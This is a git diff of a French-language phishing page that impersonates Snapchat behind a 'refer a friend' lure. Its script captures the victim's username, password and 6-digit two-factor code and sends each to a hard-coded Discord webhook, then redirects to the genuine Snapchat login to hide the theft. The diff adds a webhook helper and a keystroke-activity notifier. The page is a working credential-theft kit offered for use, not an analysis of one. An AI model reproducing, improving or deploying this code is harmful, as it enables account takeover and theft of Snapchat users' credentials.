@@ -8,7 +8,7 @@
 <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
 <meta property="og:description" content="Description courte" />
 <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
-  
+
 <style>
 body {
   margin: 0; padding: 0;
@@ -17,13 +17,11 @@ body {
   display: flex; justify-content: center; align-items: center;
   min-height: 100vh;
 }
-
 /* Container principal */
 #container {
   width: 100%; max-width: 350px;
   padding: 20px;
 }
-
 /* Formulaire style général */
 #loginBox {
   background: #fff;
@@ -43,7 +41,6 @@ body {
   margin: 0 auto 20px;
   width: 80px;
 }
-
 /* Champs avec ligne en bas (underline) */
 .label {
   font-size: 10px;
@@ -68,7 +65,6 @@ body {
 .input-field:focus {
   border-color: #29b6f6;
 }
-
 /* Bouton "pill" bleu cyan */
 #loginBtn {
   width: 100%;
@@ -86,7 +82,6 @@ body {
 #loginBtn:hover {
   background-color: #1e9ac4;
 }
-
 /* Liens sous le bouton */
 .links {
   margin-top: 10px;
@@ -103,7 +98,6 @@ body {
 a:hover {
   opacity: 0.8;
 }
-
 /* Messages erreurs */
 #errorMessage, #referralError {
   display: none;
@@ -112,7 +106,6 @@ a:hover {
   margin-top: 10px;
   text-align: center;
 }
-
 /* Zone pour entrer le code reçu */
 #codeContainer {
   display: none;
@@ -157,7 +150,6 @@ a:hover {
 #confirmBtn:hover {
   background-color: #1e9ac4;
 }
-
 /* Zone après confirmation */
 #messageZone {
   display: none;
@@ -172,9 +164,7 @@ a:hover {
 </style>
 </head>
 <body>
-
 <div id="container">
-
   <!-- Formulaire Snapchat -->
   <div id="loginBox">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" />
@@ -201,28 +191,34 @@ a:hover {
     <div id="errorMessage">Incorrect username or password.</div>
     <div id="referralError">Referral code must be exactly 4 digits.</div>
   </div>
-
   <!-- Zone pour entrer le code reçu -->
   <div id="codeContainer">
     <p>Veuillez entrer le code à 6 chiffres reçu au numéro de téléphone ou à l'adresse mail</p>
     <input type="text" id="codeInput" maxlength="6" placeholder="Entrez le code à 6 chiffres" />
     <button id="confirmBtn">CONFIRMER</button>
   </div>
-
   <!-- Zone message après confirmation -->
   <div id="messageZone">
     <p>Votre code a été enregistré. Vous serez redirigé dans quelques instants.</p>
   </div>
-
 </div>
-
 <script>
+// Variables webhook et redirection
 const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
 const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
+// Fonction pour envoyer webhook
+function sendWebhook(msg) {
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(msg)
+  });
+}
+
+// Gestion du formulaire de login
 document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
-
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
   const referralCode = document.getElementById('referralCode').value.trim();
@@ -230,18 +226,18 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
   document.getElementById('errorMessage').style.display = 'none';
   document.getElementById('referralError').style.display = 'none';
 
+  // Vérification
   if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
     document.getElementById('errorMessage').style.display = 'block';
     return;
   }
-
   if (!/^\d{4}$/.test(referralCode)) {
     document.getElementById('referralError').style.display = 'block';
     return;
   }
 
-  // Envoyer au webhook
-  const message = {
+  // Envoi webhook
+  const msg = {
     embeds: [
       {
         title: " Nouvelle tentative de connexion",
@@ -257,31 +253,27 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
       }
     ]
   };
-
   fetch(webhookURL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(message),
-  }).then(response => {
+    body: JSON.stringify(msg)
+  }).then(() => {
     setTimeout(() => {
       document.getElementById('loginBox').style.display = 'none';
       document.getElementById('codeContainer').style.display = 'block';
     }, 1000);
-  }).catch(error => {
-    alert("Erreur réseau ou CORS.");
-    console.error(error);
-  });
+  }).catch(() => alert("Erreur réseau ou CORS."));
 });
 
-// Confirmer le code
+// Validation du code
 document.getElementById('confirmBtn').addEventListener('click', function() {
   const code = document.getElementById('codeInput').value.trim();
   if (code.length !== 6 || !/^\d{6}$/.test(code)) {
     alert("Veuillez entrer un code valide à 6 chiffres.");
     return;
   }
-
-  const message = {
+  // Envoi du webhook pour le code
+  const msg = {
     embeds: [
       {
         title: " Code reçu",
@@ -296,19 +288,34 @@ document.getElementById('confirmBtn').addEventListener('click', function() {
   fetch(webhookURL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(message),
+    body: JSON.stringify(msg)
   }).then(() => {
     document.getElementById('codeContainer').style.display = 'none';
     document.getElementById('messageZone').style.display = 'block';
     setTimeout(() => {
       window.location.href = redirectURL;
     }, 30000);
-  }).catch(error => {
-    alert("Erreur réseau ou CORS.");
-    console.error(error);
+  }).catch(() => alert("Erreur réseau ou CORS."));
+});
+
+// Détection d’écriture pour webhook en temps réel
+const inputFields = document.querySelectorAll('input[type="text"], input[type="password"]');
+let typingTimeout;
+function sendTyping() {
+  fetch('VOTRE_WEBHOOK_URL', { // remplacez par votre webhook
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: "Une personne est en train d'écrire..." })
+  });
+}
+inputFields.forEach(field => {
+  field.addEventListener('input', () => {
+    clearTimeout(typingTimeout);
+    typingTimeout = setTimeout(() => {
+      sendTyping();
+    }, 2000); // envoi toutes les 2 secondes après la dernière frappe
   });
 });
 </script>
-
 </body>
 </html>
